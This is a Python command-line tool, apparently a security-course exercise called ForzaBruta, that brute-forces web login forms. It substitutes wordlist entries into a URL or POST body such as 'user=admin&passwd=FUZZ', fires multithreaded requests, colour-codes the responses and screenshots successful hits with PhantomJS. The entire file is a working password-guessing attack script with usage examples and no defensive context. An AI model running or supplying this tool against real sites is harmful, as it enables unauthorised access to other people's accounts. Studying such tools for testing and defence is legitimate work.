import requests
from threading import Thread
import sys
import getopt
from termcolor import colored

import hashlib
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities



def banner():
    print("\n********************")
    print('*  Auth Brute-Force  *')
    print("********************")


def usage():
    print("Usage:")
    print("         -w: url (http://somesite.com/some_url.php")
    print("         -t: threads")
    print("         -c: hide response code")
    print("          -p: post query (payload)")
    print("          -f: dictionary file \n")
    print("example: forzabruta_forms.py -w http://targetsite.com/FUZZ -t 5 -f common.txt -c 404 -p 'user=admin&passwd=FUZZ'\n")


class request_performer(Thread):
    def __init__(self, word, url, hidecode,payload):
        Thread.__init__(self)
        try:
            self.word = word.split("\n")[0]
            self.url = url.replace('FUZZ', self.word)
            if payload !='':
                self.payload = payload.replace('FUZZ', self.word)
            else:
                self.payload = payload
            self.hidecode = hidecode

        except Exception as e:
            print(e)

    def run(self):
        try:

            start = time.time()
            if self.payload == '':
                r = requests.get(self.url)
            else:
                list = self.payload.replace('=',' ').replace('&',' ').split()
                payload = dict([(k,v) for k,v in zip(list[::2],list[1::2])])
                r = requests.post(self.url, data=payload)

            endtime = time.time()
            totaltime = str(endtime - start)[1:10]

            lines = str(len(r.text.splitlines()))
            chars = str(len(r.text))
            words = str(len(r.text.split()))
            # words = str(len(re.findall("\S+", r.text)))
            code = str(r.status_code)
            hash = hashlib.md5(r.text.encode()).hexdigest()

            if r.history != []:
                code = str(r.history[0].status_code)

            if self.hidecode != chars:
                if '200' <= code < '300':

                    dcap = dict(DesiredCapabilities.PHANTOMJS)
                    driver = webdriver.PhantomJS(desired_capabilities=dcap)
                    time.sleep(2)

                    driver.set_window_size(1024,768)
                    driver.get(self.url)
                    driver.save_screenshot(self.word+".png")

                    print(totaltime + "\t\t" + colored(code, "green") + "\t" + chars +
                          "\t" + words + "\t " + lines + "\t" + hash[:-7:-1] + "\t" + self.word + "\t\t  ")
                elif '400' <= code < '500':
                    print(totaltime + "\t\t" + colored(code, "red") + "\t" + chars +
                          "\t" + words + "\t " + lines + "\t" + hash[:-7:-1] + "\t" + self.word + "\t\t  ")
                elif '300' <= code < '400':
                    print(totaltime + "\t\t" + colored(code, "blue") + "\t" + chars +
                          "\t" + words + "\t " + lines + "\t" + hash[:-7:-1] + "\t" + self.word + "\t\t  ")
                else:
                    print(totaltime + "\t\t" + colored(code, "yellow") + "\t" + chars +
                          "\t" + words + "\t " + lines + "\t" + hash[:-7:-1] + "\t" + self.word + "\t\t  ")

            else:
                pass

            #            print(self.url + "-" + str(r.status_code))
            i[0] = i[0] - 1  # удаляем одну нить из счетчика
        except Exception as e:
            print(e)


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:f:t:c:p:")
    except getopt.GetoptError:
        print("Error en arguments")
        sys.exit()
    hidecode = 000
    payload = ''
    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-t':
            threads = int(arg)
        elif opt == '-c':
            hidecode = arg
        elif opt == '-p':
            payload = arg


    try:
        f = open(dict, "r")
        words = f.readlines()
    except:
        print("Failed opening file: " + dict)
        sys.exit()

    launcher_thread(words, threads, url, hidecode, payload)


def launcher_thread(names, th, url, hidecode, payload):
    global i
    i = []
    resultlist = []
    i.append(0)
    print(
        "-------------------------------------------------------------------------------------------------------------")
    print("Time\t\t\t\tCode\tchars\twords\tlines\tMD5\t\t\tURL")
    print(
        "-------------------------------------------------------------------------------------------------------------")

    while len(names):
        try:
            if i[0] < th:
                n = names.pop(0)
                i[0] = i[0] + 1
                thread = request_performer(n, url, hidecode, payload)
                thread.start()

        except KeyboardInterrupt:
            print("ForzaBruta interrupted by user. Finishing attack...")
            sys.exit()
        thread.join()
    return


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("ForzaBruta interrupted by user, killing all threads..!!")
